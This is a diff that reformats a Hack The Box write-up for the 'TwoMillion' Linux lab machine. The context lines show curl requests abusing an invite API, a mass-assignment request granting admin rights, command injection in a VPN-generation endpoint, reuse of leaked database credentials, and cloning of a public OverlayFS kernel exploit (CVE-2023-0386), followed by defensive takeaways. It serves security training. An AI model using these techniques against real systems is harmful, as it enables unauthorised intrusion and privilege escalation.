@@ -1,189 +1,12 @@
----
-title: "2million - Hack The Box"
-target: "2million"
-os: "Linux"
-difficulty: "Easy"
-status: "Pwned"
-vectors: "REST API Reversing, ROT13 Invite, Command Injection (VPN .ovpn), Kernel Exploit (Dirty Cred)"
-tags:
-  - ciber
-  - htb
-  - api
-  - rot13
-  - command-injection
-  - dirty-cred
-  - kernel
-synced: "2026-11-02 12:08"
----
+# TwoMillion
+
+**Platform:** Hack The Box · **Type:** Machine · **OS:** Linux · **Difficulty:** Easy
+
+> Invite API abuse, admin via insecure API endpoint, command injection in the VPN generator, reused DB credentials, OverlayFS kernel exploit (CVE-2023-0386)
 
 <p align="center">
   <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cd-c843-47e4-97f7-c0a2d69b78ce.png" alt="TwoMillion Avatar" width="220">
 </p>
-
-## Operating System: Linux
-![[Linux.png|70]]
-
-## Machine Metadata
-
-| Property | Value |
-| :--- | :--- |
-| **Machine ID** | 547 |
-| **Machine Name** | TwoMillion |
-| **IP Address** | N/A |
-| **Status** | Pwned |
-| **Active on HTB** | ❌ |
-| **User Flag** | ✅ |
-| **Root Flag** | ✅ |
-| **Difficulty** | Easy |
-| **Stars** | ⭐️ 4.6 |
-| **Created Note** | 2026-10-16 |
-| **Release Date** | 2023-06-07 |
-| **Tags** | #Web_Application #Remote_Code_Execution #OS_Command_Injection #Misconfiguration #Command_Execution #PHP #JavaScript #Custom #NGINX #Injections |
-
-<p style="display:none">
-id:: 547
-active:: False
-name:: TwoMillion
-os:: Linux
-user_flag:: True
-root_flag:: True
-difficulty_text:: Easy
-stars:: 4.6
-created:: 2026-10-16
-published:: 2023-06-07
-avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/9e4d90cd-c843-47e4-97f7-c0a2d69b78ce.png
-tags:: #Web_Application #Remote_Code_Execution #OS_Command_Injection #Misconfiguration #Command_Execution #PHP #JavaScript #Custom #NGINX #Injections
-</p>
-
-## Statistics
-
-### Radar Matrix
-```chartsview
-#-----------------#
-#- chart type    -#
-#-----------------#
-type: Radar
-
-#-----------------#
-#- chart data    -#
-#-----------------#
-data:
-  - item: "ENUM"
-    user: "user"
-    score: 6
-  - item: "REAL"
-    user: "user"
-    score: 5.7
-  - item: "CVE"
-    user: "user"
-    score: 6
-  - item: "CUSTOM"
-    user: "user"
-    score: 4
-  - item: "CTF"
-    user: "user"
-    score: 4.3
-  - item: "ENUM"
-    user: "author"
-    score: 0
-  - item: "REAL"
-    user: "author"
-    score: 0
-  - item: "CVE"
-    user: "author"
-    score: 0
-  - item: "CUSTOM"
-    user: "author"
-    score: 0
-  - item: "CTF"
-    user: "author"
-    score: 0
-
-#-----------------#
-#- chart options -#
-#-----------------#
-options:
-  xField: "item"
-  yField: "score"
-  seriesField: "user"
-  meta:
-    score:
-      alias: "Score"
-      min: 0
-      nice: true
-  xAxis:
-    line: null
-    tickLine: null
-  yAxis:
-    label: false
-    grid:
-      alternateColor: "rgba(0, 0, 0, 0.04)"
-  point: []
-  area: []
-```
-
-### Community Difficulty Rating
-```chartsview
-#-----------------#
-#- chart type    -#
-#-----------------#
-type: Column
-
-#-----------------#
-#- chart data    -#
-#-----------------#
-data:
-  - folder: "PIECE OF CAKE"
-    count: 1228
-  - folder: "VERY EASY"
-    count: 1758
-  - folder: "EASY"
-    count: 7884
-  - folder: "NOT TOO EASY"
-    count: 7570
-  - folder: "MEDIUM"
-    count: 3165
-  - folder: "A BIT HARD"
-    count: 1183
-  - folder: "HARD"
-    count: 767
-  - folder: "EXTREMELY HARD"
-    count: 148
-  - folder: "INSANE"
-    count: 47
-  - folder: "BRAINFUCK"
-    count: 154
-
-#-----------------#
-#- chart options -#
-#-----------------#
-options:
-  xField: "folder"
-  yField: "count"
-  padding: auto
-  label:
-    position: "middle"
-    style:
-      opacity: 0.6
-      fontSize: 12
-  columnStyle:
-    fillOpacity: 0.5
-    lineWidth: 1
-    strokeOpacity: 0.7
-    shadowColor: "grey"
-    shadowBlur: 10
-    shadowOffsetX: 5
-    shadowOffsetY: 5
-  xAxis:
-    label:
-      autoHide: false
-      autoRotate: true
-  meta:
-    count:
-      alias: "Votes"
-```
-
----
 
 ## Reconnaissance
 
@@ -213,7 +36,7 @@ function makeInviteCode() {
 }
 ```
 
-We make a [[Web - HTTP - Request Methods and CRUD APIs|POST request]] using [[Pentesting - Tools - cURL Cheatsheet|curl]] to the endpoint responsible for explaining how to generate an invite code:
+We make a POST request using curl to the endpoint responsible for explaining how to generate an invite code:
 
 ```sh
 curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
@@ -276,7 +99,7 @@ Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
 ```
 
-Using the obtained session [[Web - HTTP - Cookies & Session Management|cookie]], we perform a [[Web - HTTP - Request Methods and CRUD APIs|GET request]] to the `/api` endpoint to enumerate available routes:
+Using the obtained session cookie, we perform a GET request to the `/api` endpoint to enumerate available routes:
 
 ```sh
 curl -sv http://2million.htb/api --cookie "PHPSESSID=860m9ksncif6qe701u480rco4c" | jq
@@ -312,7 +135,7 @@ First, we check our admin status:
 ```sh
 curl -sv http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=860m9ksncif6qe701u480rco4c" | jq
 ```
-The response is `{"message": false}`. We elevate our privileges to admin exploiting [[Web - API - Mass Assignment and Parameter Tampering|Mass Assignment & Parameter Tampering]] by sending a PUT request to the `/api/v1/admin/settings/update` endpoint. After some trial and error dealing with missing parameters and content types, we structure the payload correctly:
+The response is `{"message": false}`. We elevate our privileges to admin exploiting Mass Assignment & Parameter Tampering by sending a PUT request to the `/api/v1/admin/settings/update` endpoint. After some trial and error dealing with missing parameters and content types, we structure the payload correctly:
 
 ```sh
 curl -v -X PUT http://2million.htb/api/v1/admin/settings/update \
@@ -337,7 +160,7 @@ Checking `/api/v1/admin/auth` again confirms our new role:
 }
 ```
 
-As an administrator, we now have access to `/api/v1/admin/vpn/generate`. By providing a username in the POST request, the application generates a VPN configuration file. Since this executes a backend system command, we test for [[Web - Injection - OS Command Injection in API Parameters|OS Command Injection]] in the `username` field:
+As an administrator, we now have access to `/api/v1/admin/vpn/generate`. By providing a username in the POST request, the application generates a VPN configuration file. Since this executes a backend system command, we test for OS Command Injection in the `username` field:
 
 ```sh
 curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
@@ -351,7 +174,7 @@ This returns command execution output:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![[Pasted image 20260926171447.png]]
+![Pasted image 20260926171447](../../../Attachments/Pasted%20image%2020260926171447.png)
 
 With Remote Code Execution (RCE) achieved, we look around the web directory and find a `.env` file containing database credentials:
 
@@ -399,9 +222,9 @@ I'm know you're working as fast as you can to do the DB migration. While we're p
 HTB Godfather
 ```
 
-![[Pasted image 20260926175358.png]]
+![Pasted image 20260926175358](../../../Attachments/Pasted%20image%2020260926175358.png)
 
-The email directly points to an OverlayFS/FUSE vulnerability. This corresponds to [[Linux - PrivEsc - OverlayFS Kernel Exploit|CVE-2023-0386 (OverlayFS Kernel Exploit)]]. We download the exploit locally and transfer it to the target machine:
+The email directly points to an OverlayFS/FUSE vulnerability. This corresponds to CVE-2023-0386 (OverlayFS Kernel Exploit). We download the exploit locally and transfer it to the target machine:
 
 ```sh
 git clone https://github.com/xkaneiki/CVE-2023-0386
@@ -437,14 +260,8 @@ In this machine, we started by interacting with an API to generate invite codes.
 
 ---
 
-## Post-Engagement & Zettelkasten Notes
+## Key Takeaways
 
-### Key Takeaways & Defense
 - **API Mass Assignment**: Restrict object parameter binding so clients cannot tamper with fields like `is_admin`.
 - **System Command Injection**: Administrative functions generating files (e.g. OpenVPN certificates) must use safe APIs or sanitize inputs against command delimiters (`;`, `&`, `|`).
 - **Kernel Patch Management**: The OverlayFS vulnerability (CVE-2023-0386) demonstrates the critical importance of keeping the Linux kernel updated.
-
-### Atomic Notes to Extract
-- [[Web - API - Mass Assignment and Parameter Tampering|Mass Assignment & Parameter Tampering]]
-- [[Web - Injection - OS Command Injection in API Parameters|OS Command Injection in API Parameters]]
-- [[Linux - PrivEsc - OverlayFS Kernel Exploit|CVE-2023-0386 (OverlayFS Kernel Exploit)]]
